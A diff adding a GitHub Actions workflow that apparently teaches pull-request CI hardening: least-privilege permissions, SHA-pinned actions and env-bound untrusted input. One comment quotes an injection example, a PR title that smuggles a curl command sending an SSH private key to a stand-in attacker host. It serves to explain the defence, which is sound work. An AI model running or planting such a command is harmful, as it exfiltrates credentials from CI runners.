@@ -1,0 +1,170 @@
+# Module 24: Secure PR gate — least privilege, injection safety, pinned actions
+#
+# The structural idea is a privilege boundary: the job that RUNS untrusted PR
+# code holds no capability worth stealing, and the job that HOLDS write access
+# never puts untrusted code on the runner.
+#
+#   test          runs the PR's code.  contents: read.  no secrets.
+#   secret-scan   runs the PR's code.  contents: read.  SHA-pinned scanner.
+#   report        holds write access.  NO CHECKOUT AT ALL.
+#
+# Four defences are demonstrated:
+#   1. `permissions: {}` at workflow level -- every job opts in explicitly.
+#   2. Untrusted event data passed via `env:`, never interpolated into `run:`.
+#   3. Third-party action pinned to an immutable SHA with a version comment.
+#   4. `on: pull_request` (not pull_request_target), so a fork PR gets a
+#      read-only token and no secrets at all.
+name: module-24-supply-chain-security
+
+run-name: >-
+  Secure gate for PR #${{ github.event.pull_request.number || 'manual' }}
+
+on:
+  pull_request:
+  workflow_dispatch:
+
+# Deny by default. Naming ANY scope sets every unnamed scope to `none`, so an
+# empty map here means each job must declare what it needs.
+permissions: {}
+
+concurrency:
+  group: module-24-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Runs untrusted PR code. Deliberately powerless.
+  # ---------------------------------------------------------------------------
+  test:
+    name: Test PR code
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read          # enough for checkout, nothing more
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v7
+
+      - name: Set up Python suite
+        uses: ./.github/actions/setup-python-suite
+        with:
+          python-version: "3.13"
+          working-directory: your-solution-root-folder-name
+
+      # A fork PR has no secrets, so the suite must be runnable without them.
+      # Pointing at a mock backend is what makes that possible -- if the tests
+      # needed real credentials, there would be no safe way to run fork PRs.
+      - name: Run smoke suite against a mock backend
+        working-directory: your-solution-root-folder-name
+        env:
+          BASE_URL: http://localhost:8080
+        run: |
+          behave --tags=smoke \
+            -f allure_behave.formatter:AllureFormatter \
+            -o reports/allure-results
+
+      - name: Upload Allure results
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: allure-pr-smoke
+          path: your-solution-root-folder-name/reports/allure-results/
+          retention-days: 7
+          if-no-files-found: warn
+
+  # ---------------------------------------------------------------------------
+  # Secret scanning. Third-party action, so pinned to a full commit SHA.
+  # ---------------------------------------------------------------------------
+  secret-scan:
+    name: Scan for committed secrets
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Checkout full history
+        uses: actions/checkout@v7
+        with:
+          # A secret scanner needs history. The default shallow clone would hide
+          # anything committed and later removed, which is the usual case.
+          fetch-depth: 0
+
+      - name: Scan for verified secrets
+        # Pinned to an immutable SHA, version recorded in the comment so the pin
+        # stays auditable. A scanner runs with repository access, so a mutable
+        # `@main` would give whoever controls that branch code execution here.
+        # Resolve a SHA with:
+        #   gh api repos/<owner>/<repo>/commits/<tag> --jq .sha
+        uses: trufflesecurity/trufflehog@6f3c981e7b77f235fd2702dd74af25fc4b72bf11 # v3.96.0
+        with:
+          extra_args: --only-verified
+
+  # ---------------------------------------------------------------------------
+  # Demonstrates injection safety on genuinely attacker-controlled values.
+  # ---------------------------------------------------------------------------
+  inspect-metadata:
+    name: Inspect PR metadata safely
+    runs-on: ubuntu-latest
+    permissions: {}           # needs nothing: no checkout, no API calls
+    if: github.event_name == 'pull_request'
+    steps:
+      # Everything under github.event.* is attacker-controlled: titles, bodies,
+      # branch names, commit messages, author names, label names. Binding them
+      # to env vars makes the shell treat them as DATA. Interpolating them into
+      # the script text would make a title like
+      #   "; curl evil.example/$(cat ~/.ssh/id_rsa); #
+      # a second command.
+      - name: Report PR metadata
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BRANCH: ${{ github.event.pull_request.head.ref }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+        run: |
+          # Quoted, so a value containing spaces or metacharacters stays one
+          # argument rather than being re-parsed.
+          echo "Title:  $PR_TITLE"
+          echo "Branch: $PR_BRANCH"
+          echo "Author: $PR_AUTHOR"
+
+  # ---------------------------------------------------------------------------
+  # Holds write access. Never checks out untrusted code.
+  # ---------------------------------------------------------------------------
+  report:
+    name: Comment on the PR
+    needs: [test, secret-scan]
+    if: always() && github.event_name == 'pull_request'
+    runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write    # the only scope with any real power here
+    steps:
+      # NOTE THE ABSENCE OF A CHECKOUT. This job can write to the PR, so it must
+      # never place the contributor's code on the runner. That separation -- not
+      # any single setting -- is what makes the gate safe.
+      - name: Post result comment
+        uses: actions/github-script@v9
+        env:
+          TEST_RESULT: ${{ needs.test.result }}
+          SCAN_RESULT: ${{ needs.secret-scan.result }}
+        with:
+          script: |
+            // Read from process.env rather than letting ${{ }} substitute into
+            // this script -- otherwise a hostile value breaks out of the
+            // JavaScript instead of the shell.
+            const results = {
+              Tests: process.env.TEST_RESULT,
+              'Secret scan': process.env.SCAN_RESULT,
+            };
+            const rows = Object.entries(results)
+              .map(([name, outcome]) => `| ${name} | ${outcome} |`)
+              .join('\n');
+            const body = [
+              '### PR gate results',
+              '',
+              '| Check | Outcome |',
+              '| --- | --- |',
+              rows,
+            ].join('\n');
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: context.issue.number,
+              body,
+            });
